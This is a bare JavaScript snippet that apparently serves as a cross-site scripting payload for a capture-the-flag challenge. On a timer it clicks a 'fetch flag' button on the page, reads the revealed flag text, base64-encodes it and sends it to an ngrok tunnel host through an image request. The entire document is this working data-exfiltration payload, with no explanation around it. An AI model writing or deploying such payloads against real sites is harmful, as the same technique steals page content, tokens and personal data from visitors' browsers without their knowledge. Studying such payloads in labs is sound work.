setTimeout(()=>{
    let btn=document.getElementById("fetchFlag2Btn")
    if(btn) btn.click()

    setTimeout(()=>{
        let flag=document.getElementById("flag2Content")
        if(flag){
            new Image().src="https://30a8-2402-800-61c7-539d-60ad-28f0-6942-5ea2.ngrok-free.app?flag="+btoa(flag.innerText)
        }
    },2000)

},2000)
